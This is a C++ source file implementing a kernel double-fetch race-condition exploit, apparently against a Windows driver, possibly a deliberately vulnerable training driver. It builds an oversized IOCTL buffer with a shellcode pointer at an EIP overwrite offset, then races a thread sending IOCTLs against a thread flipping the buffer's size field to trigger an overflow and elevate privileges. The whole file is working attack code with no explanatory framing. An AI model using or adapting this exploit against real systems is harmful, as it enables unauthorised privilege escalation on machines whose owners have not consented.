#include <cassert>
#include "DoubleFetch.h"

bool 
ExploitDoubleFetch::exploit() {

	static const DWORD Max_Failures = 1000;
	static const size_t EIP_Overwrite_Offset = 2080;
	
	assert(EIP_Overwrite_Offset < Overflowing_Buffer_Size);
	
	ioctlInputBuffer.reset(new UCHAR[Overflowing_Buffer_Size]);
	if(!ioctlInputBuffer) {
		wcerr << L"[!] Could not allocate buffer of size: 0x" 
			<< hex << setw(8) << setfill(L'0') << Overflowing_Buffer_Size << endl;
		return false;
	}
	
	memset(ioctlInputBuffer.get(), 'A', Overflowing_Buffer_Size);

	auto shellcodePointer = adjustPayloadEpilogue(8, true);
	
	UCHAR *buffPtr = ioctlInputBuffer.get();
	*(reinterpret_cast<DWORD*>(&buffPtr[EIP_Overwrite_Offset])) = 
		reinterpret_cast<DWORD>(*shellcodePointer);
	
	stopThreads = false;
	startThreads = false;
	
	flippingObject.buffer = ioctlInputBuffer.get();
	flippingObject.size = Max_Accepted_Buffer_Size;
	
	wcout << L"[+] Step 1: Creating triggering thread (first one)." << endl;
	std::thread triggeringThread(&ExploitDoubleFetch::triggerThread, this);
	
	wcout << L"[+] Step 2: Creating flipping thread (second one)." << endl;
	std::thread flippingThread(&ExploitDoubleFetch::flipThread, this);
	
	wcout << L"[+] Step 3: Launch both threads - start fetching!" << endl;
	
	startThreads = true;
	
	DWORD counter = 0;
	while(!checkExploitSuccess(true) && counter++ < Max_Failures);

	stopThreads = true;
	triggeringThread.join();
	flippingThread.join();

	if (counter >= Max_Failures) {
		wcout << L"[!] Exploit failed: Couldn't elevate in " 
			<< dec << ioctlPackets 
			<< L" num of fetches." << endl << endl;
		return false;
	}
	
	wcout << L"[.] Exploit could have succeeded after " 
		<< dec << ioctlPackets << L" fetches." << endl << endl;

	return true;
}

void 
ExploitDoubleFetch::triggerThread() {
	while(!startThreads) {}
	
	while(!stopThreads) {
		driver.SendIOCTLQuiet (
			ExploitDoubleFetch::Ioctl_Code,
			&flippingObject,
			sizeof(flippingObject)
		);
		
		ioctlPackets++;
	}
}

void 
ExploitDoubleFetch::flipThread() {
	while(!startThreads) {}

	volatile register unsigned int flip = Flip_Difference;
	while(!stopThreads) {
		flippingObject.size ^= flip;
	}
}
